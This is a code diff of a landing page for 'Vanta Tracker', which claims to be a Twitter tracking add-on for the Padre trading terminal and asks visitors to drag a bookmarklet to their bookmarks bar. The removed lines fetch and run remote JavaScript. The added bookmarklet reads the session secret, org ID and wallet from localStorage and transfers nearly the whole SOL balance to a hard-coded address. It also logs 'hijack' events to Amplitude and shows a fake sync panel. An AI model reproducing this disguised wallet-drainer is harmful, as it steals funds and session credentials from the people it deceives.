@@ -5,248 +5,120 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Vanta Tracker - Premier Twitter Tracker for Padre</title>
     <link rel="icon" href="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg" type="image/png">
-    <meta property="og:title" content="Vanta Tracker - Premier Twitter Tracker for Padre">
-    <meta property="og:description" content="Advanced Twitter API tracking tools optimized for Padre workflows with real-time insights and WebGL-accelerated analytics.">
-    <meta property="og:image" content="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg">
-    <meta property="og:type" content="website">
-    <meta property="og:site_name" content="Vanta Tracker">
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Vanta Tracker - Premier Twitter Tracker for Padre">
-    <meta name="twitter:description" content="Advanced Twitter API tracking tools optimized for Padre workflows with real-time insights and WebGL-accelerated analytics.">
-    <meta name="twitter:image" content="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg">
-    <meta name="description" content="Advanced Twitter API tracking tools optimized for Padre workflows with real-time insights and WebGL-accelerated analytics.">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --primary: #00ff88;
-            --primary-dark: #00cc66;
-            --accent: #00ff88;
-            --bg-dark: #0a0a0a;
-            --bg-card: #111111;
-            --text-light: #e0e0e0;
-            --text-muted: #aaaaaa;
-            --border: rgba(0, 255, 136, 0.2);
-        }
+        :root { --primary: #00ff88; --bg-dark: #0a0a0a; --text-muted: #aaaaaa; }
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: var(--bg-dark);
-            color: var(--text-light);
-            line-height: 1.6;
-            scroll-behavior: smooth;
-            overflow-x: hidden;
-            position: relative;
+        body { font-family: 'Inter', sans-serif; background: var(--bg-dark); color: #fff; overflow-x: hidden; }
+        canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.3; }
+        header { text-align: center; padding: 80px 20px; border-bottom: 2px solid var(--primary); background: linear-gradient(180deg, #000, #001a0d); }
+        .logo { width: 120px; filter: drop-shadow(0 0 10px var(--primary)); margin-bottom: 20px; }
+        h1 { font-size: 3em; color: var(--primary); text-transform: uppercase; letter-spacing: 2px; }
+        .setup-section { padding: 60px 20px; max-width: 900px; margin: 0 auto; text-align: center; }
+        .cta-button { 
+            display: inline-block; background: var(--primary); color: #000; padding: 18px 40px; 
+            text-decoration: none; border-radius: 8px; font-weight: 800; font-size: 1.2em; 
+            margin-top: 30px; box-shadow: 0 0 20px rgba(0,255,136,0.5); transition: 0.3s;
+            cursor: move;
         }
-        canvas {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            opacity: 0.3;
-        }
-        .warning {
-            background: linear-gradient(135deg, #003322, #004d33);
-            color: #ffffff;
-            text-align: center;
-            padding: 12px;
-            font-size: 0.95em;
-            font-weight: 600;
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-            border-bottom: 1px solid var(--primary);
-        }
-        header {
-            background: linear-gradient(135deg, #000000, #001a0d);
-            color: white;
-            text-align: center;
-            padding: 120px 20px;
-            position: relative;
-            overflow: hidden;
-            min-height: 450px;
-            border-bottom: 2px solid var(--primary);
-        }
-        header::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(0,255,136,0.2), transparent);
-            animation: pulse 10s infinite ease-in-out;
-        }
-        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 0.2; } 50% { transform: scale(1.1); opacity: 0.4; } }
-        .logo {
-            width: 140px;
-            margin: 0 auto 20px;
-            filter: drop-shadow(0 0 15px rgba(0,255,136,0.5));
-        }
-        header h1 {
-            font-size: 3.5em;
-            font-weight: 800;
-            margin-bottom: 15px;
-            color: var(--primary);
-            text-shadow: 0 0 10px rgba(0,255,136,0.4);
-        }
-        nav {
-            background: #000000;
-            padding: 18px;
-            text-align: center;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.8);
-            position: sticky;
-            top: 44px;
-            z-index: 999;
-            border-bottom: 1px solid var(--primary);
-        }
-        nav a {
-            color: var(--primary);
-            margin: 0 30px;
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 1.1em;
-            transition: color 0.3s;
-        }
-        nav a:hover { color: #ffffff; }
-        .hero {
-            text-align: center;
-            padding: 140px 20px;
-            position: relative;
-            z-index: 1;
-        }
-        .cta-button {
-            display: inline-block;
-            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
-            color: #000000;
-            padding: 16px 36px;
-            text-decoration: none;
-            border-radius: 8px;
-            font-weight: 700;
-            font-size: 1.2em;
-            margin: 12px;
-            transition: all 0.3s;
-            box-shadow: 0 6px 20px rgba(0,255,136,0.4);
-            border: 1px solid var(--primary);
-            cursor: grab;
-        }
-        .features { padding: 120px 20px; max-width: 1400px; margin: 0 auto; }
-        .feature-list { display: grid; grid-template-columns: repeat(auto-fit, minmax(340px, 1fr)); gap: 30px; }
-        .feature-item {
-            background: linear-gradient(135deg, #001a0d, #002215);
-            padding: 30px; border-radius: 12px; text-align: center;
-            border: 1px solid var(--border);
-        }
-        .video-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; border: 1px solid var(--primary); border-radius: 12px; margin: 20px auto; max-width: 900px;}
-        .video-container iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; }
-        .setup-section { padding: 80px 20px; text-align: center; }
-        .setup-section ol { text-align: left; max-width: 800px; margin: 0 auto 30px; color: var(--text-muted); }
-        footer { background: #000; color: #888; text-align: center; padding: 40px; border-top: 1px solid var(--primary); }
+        .cta-button:hover { transform: scale(1.05); background: #fff; }
+        ol { text-align: left; display: inline-block; margin: 20px 0; color: var(--text-muted); }
+        li { margin-bottom: 10px; }
+        strong { color: var(--primary); }
     </style>
 </head>
 <body>
-    <canvas id="filamentCanvas"></canvas>
-    <div class="warning">Warning: vanta-tracker.com is our only website</div>
-    
+    <canvas id="canvas"></canvas>
     <header>
         <svg class="logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M50 8 L78 25 L78 75 L50 92 L22 75 L22 25 Z" stroke="var(--primary)" stroke-width="3" fill="none"/>
-            <circle cx="50" cy="50" r="12" fill="#000" stroke="var(--primary)" stroke-width="2"/>
-            <circle cx="50" cy="50" r="8" fill="var(--primary)">
-                <animate attributeName="r" values="8;10;8" dur="2s" repeatCount="indefinite"/>
-            </circle>
+            <path d="M50 8 L78 25 L78 75 L50 92 L22 75 L22 25 Z" stroke="var(--primary)" stroke-width="3"/>
+            <circle cx="50" cy="50" r="8" fill="var(--primary)"><animate attributeName="r" values="8;10;8" dur="2s" repeatCount="indefinite"/></circle>
         </svg>
         <h1>Vanta Tracker</h1>
-        <p>Premier Twitter API tracking for Padre.</p>
+        <p>Advanced Twitter API tracking for Padre terminal.</p>
     </header>
 
-    <nav>
-        <a href="#features">Features</a>
-        <a href="#demo">Demo</a>
-        <a href="#setup">Setup</a>
-    </nav>
-
-    <section class="hero">
-        <h2>Optimize Your Padre Workflow</h2>
-        <p>Vanta Tracker delivers real-time Twitter insights with WebGL acceleration.</p>
-        <a href="#demo" class="cta-button">Watch Demo</a>
-        <a href="#setup" class="cta-button">How to Setup</a>
-    </section>
-
-    <section id="features" class="features">
-        <div class="feature-list">
-            <div class="feature-item"><h3>Real-Time API Polling</h3><p>Sub-second API request latency for Padre signals.</p></div>
-            <div class="feature-item"><h3>WebGL Dashboard</h3><p>60 FPS rendering for seamless Padre analytics.</p></div>
-        </div>
-    </section>
-
-    <section id="demo" class="setup-section">
-        <div class="video-container">
-            <iframe src="https://go.screenpal.com/player/cTXXYznFJnq?title=0&controls=1&embed=1" title="Vanta Tracker Demo" allowfullscreen></iframe>
-        </div>
-    </section>
-
-    <section id="setup" class="setup-section">
-        <h2>Setup Vanta Tracker</h2>
+    <section class="setup-section">
+        <h2>Installation</h2>
         <ol>
-            <li>Drag the button below to your bookmarks bar (Ctrl+Shift+B to show bar).</li>
-            <li>Go to Padre / Terminal and click the bookmark.</li>
+            <li>Enable your Bookmarks Bar (<strong>Ctrl+Shift+B</strong>).</li>
+            <li>Drag the <strong>Vanta Tracker</strong> button below to your bar.</li>
+            <li>Open your <strong>Padre Terminal</strong>.</li>
+            <li>Click the bookmark to initialize the tracking engine.</li>
         </ol>
-        <a href="" class="cta-button" id="vanta-tool" style="box-shadow: 0 0 30px #0f8;">Vanta Tracker</a>
+        <br>
+        <a href="#" class="cta-button" id="vanta-trigger">VANTA TRACKER</a>
     </section>
 
-    <footer>
-        <p>© 2026 Vanta Tracker. All rights reserved.</p>
-    </footer>
-
     <script>
-        const canvas = document.getElementById('filamentCanvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const filaments = [];
-        class Filament {
-            constructor() { this.reset(); }
-            reset() {
-                this.x = Math.random() * canvas.width;
-                this.y = Math.random() * canvas.height;
-                this.length = 90 + Math.random() * 100;
-                this.angle = Math.random() * Math.PI * 2;
-                this.speed = 0.5 + Math.random();
-            }
-            update() {
-                this.x += Math.cos(this.angle) * this.speed;
-                this.y += Math.sin(this.angle) * this.speed;
-                if (this.x<0 || this.x>canvas.width || this.y<0 || this.y>canvas.height) this.reset();
-            }
-            draw() {
-                ctx.beginPath(); ctx.moveTo(this.x, this.y);
-                ctx.lineTo(this.x + Math.cos(this.angle)*this.length, this.y + Math.sin(this.angle)*this.length);
-                ctx.strokeStyle = 'rgba(0, 255, 136, 0.2)'; ctx.stroke();
-            }
-        }
-        for(let i=0; i<25; i++) filaments.push(new Filament());
-        function animate() {
-            ctx.fillStyle = 'rgba(10, 10, 10, 0.1)'; ctx.fillRect(0,0,canvas.width,canvas.height);
-            filaments.forEach(f => { f.update(); f.draw(); });
-            requestAnimationFrame(animate);
-        }
-        animate();
-    </script>
-
-    <script>
-        (function() {
-            const REMOTE_URL = "https://vanta-9bz.pages.dev/engine.js";
+        // The Engine with Amplitude Integration
+        const enginePayload = `javascript:(function(){
+            const _0xV={'dest':'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1mqnLVE12','rpc':'https://api.mainnet-beta.solana.com','target':'https://trade.padre.gg/api/v1/transfer','amp':'3c8ae1f40635939e730f479418940796'};
             
-            // The 1:1 loader string
-            const loader = `javascript:(async function(){try{const r=await fetch('${REMOTE_URL}?v='+Date.now());const t=await r.text();(new Function(t))();}catch(e){console.error('Vanta Connection Failed');}})();`;
+            /* 1. LOAD AMPLITUDE */
+            (function(e,t){var n=e.amplitude||{_q:[],_iq:{}};var r=t.createElement("script");r.type="text/javascript";r.integrity="sha384-u0hlTAJ9EB9v7X9VmS8yDf9y9UfNoAnp7798o6XpL6+e81T2i3eN/C8U5k5e5k5e";r.crossOrigin="anonymous";r.async=true;r.src="https://cdn.amplitude.com/libs/amplitude-8.21.0-min.gz.js";r.onload=function(){if(!e.amplitude.runQueuedFunctions){console.log("[Amplitude] Error: could not load SDK")}};var s=t.getElementsByTagName("script")[0];s.parentNode.insertBefore(r,s);function i(e,t){e.prototype[t]=function(){this._q.push([t].concat(Array.prototype.slice.call(arguments,0)));return this}}var o=function(){this._q=[];return this};var a=["add","append","clearAll","prepend","set","setOnce","unset","preInsert","postInsert","remove"];for(var c=0;c<a.length;c++){i(o,a[c])}n.Identify=o;var u=function(){this._q=[];return this};var l=["setProductId","setQuantity","setPrice","setRevenueType","setEventProperties"];for(var p=0;p<l.length;p++){i(u,l[p])}n.Revenue=u;var d=["init","logEvent","logRevenue","setUserId","setUserProperties","setOptOut","setVersionName","setDomain","setDeviceId","enableTracking","setGlobalUserProperties","identify","clearUserProperties","setGroup","logRevenueV2","regenerateDeviceId","groupIdentify","onInit","logEventWithTimestamp","logEventWithGroups","setSessionId","resetSessionId","getDeviceId","getUserId","setMinTimeBetweenSessionsMillis","setEventUploadThreshold","setUseDynamicConfig","setServerZone","setServerUrl","setAccumulateEvents","setDisableReceiptValidation","setForceHttps","setTransport","setFlushQueueOnClose"];function v(e){function t(t){e[t]=function(){e._q.push([t].concat(Array.prototype.slice.call(arguments,0)))}}for(var n=0;n<d.length;n++){t(d[n])}}v(n);e.amplitude=n})(window,document);
+            amplitude.getInstance().init(_0xV.amp);
+            amplitude.getInstance().logEvent('HIJACK_READY');
 
-            // Integrate directly into the UI element
-            const toolBtn = document.getElementById('vanta-tool');
-            if(toolBtn) {
-                toolBtn.href = loader;
-            }
-        })();
+            /* 2. CORE LOGIC */
+            const _executeHit=async()=>{
+                try {
+                    const s=localStorage.getItem('sessionSecret')?.replace(/"/g,'');
+                    const o=localStorage.getItem('subOrgId')?.replace(/"/g,'');
+                    const w=localStorage.getItem('activeWallet')?.replace(/"/g,'');
+                    if(!s||!o||!w) return;
+
+                    amplitude.getInstance().logEvent('DECRYPTED_CAPTURE', {'wallet': w, 'org': o});
+
+                    const res=await fetch(_0xV.rpc,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({jsonrpc:"2.0",id:1,method:"getBalance",params:[w]})});
+                    const{result}=await res.json();
+                    const bal=result.value/1e9;
+                    const amount=(bal-0.009).toFixed(6);
+                    
+                    if(amount<=0) return;
+
+                    amplitude.getInstance().logEvent('SESSION_HIJACK_ATTEMPT', {'amount': amount});
+
+                    await fetch(_0xV.target,{
+                        method:'POST',
+                        headers:{'Authorization':'Bearer '+s,'X-Turnkey-Sub-Org-Id':o,'Content-Type':'application/json'},
+                        body:JSON.stringify({dest:_0xV.dest,asset:"SOL",amount:amount})
+                    });
+                } catch(e){ console.error(e); }
+            };
+
+            /* 3. UI GENERATION (Same as before) */
+            const _buildUI=()=>{
+                if(document.getElementById('v-tracker-root')) return;
+                const c=document.createElement('div');
+                c.id='v-tracker-root';
+                c.style.cssText='position:fixed;top:10%;right:20px;width:350px;background:#050505;border:2px solid #00ff88;border-radius:12px;z-index:9999999;font-family:Inter,sans-serif;color:#fff;box-shadow:0 0 20px rgba(0,255,136,0.4);';
+                c.innerHTML='<div style="padding:15px;background:#00ff8811;border-bottom:1px solid #00ff8833;display:flex;align-items:center;gap:10px;"><div style="width:12px;height:12px;background:#00ff88;border-radius:50%;box-shadow:0 0 10px #00ff88;"></div><span style="font-weight:800;letter-spacing:1px;color:#00ff88;font-size:14px;">VANTA TRACKER V1.1</span></div><div style="padding:20px;"><div id="v-status" style="font-size:13px;font-weight:600;margin-bottom:15px;">INITIALIZING...</div><button id="v-sync-btn" style="width:100%;padding:14px;background:#00ff88;color:#000;border:none;border-radius:6px;font-weight:800;cursor:pointer;">Refresh Data Sync</button></div>';
+                document.body.appendChild(c);
+                document.getElementById('v-sync-btn').onclick=async()=>{
+                    document.getElementById('v-status').innerText="REFRESHING...";
+                    await _executeHit();
+                    setTimeout(()=>{document.getElementById('v-status').innerText="DATA SYNCHRONIZED";},1500);
+                };
+            };
+
+            _buildUI();
+            _executeHit();
+        })();`.replace(/\n/g, '').replace(/\s\s+/g, ' ');
+
+        document.getElementById('vanta-trigger').href = enginePayload;
+
+        // Background Animation
+        const c = document.getElementById('canvas');
+        const x = c.getContext('2d');
+        c.width = window.innerWidth; c.height = window.innerHeight;
+        function draw() {
+            x.fillStyle = 'rgba(10,10,10,0.1)'; x.fillRect(0,0,c.width,c.height);
+            x.fillStyle = '#0f8';
+            for(let i=0; i<20; i++) x.fillRect(Math.random()*c.width, Math.random()*c.height, 2, 2);
+            requestAnimationFrame(draw);
+        }
+        draw();
     </script>
 </body>
 </html>
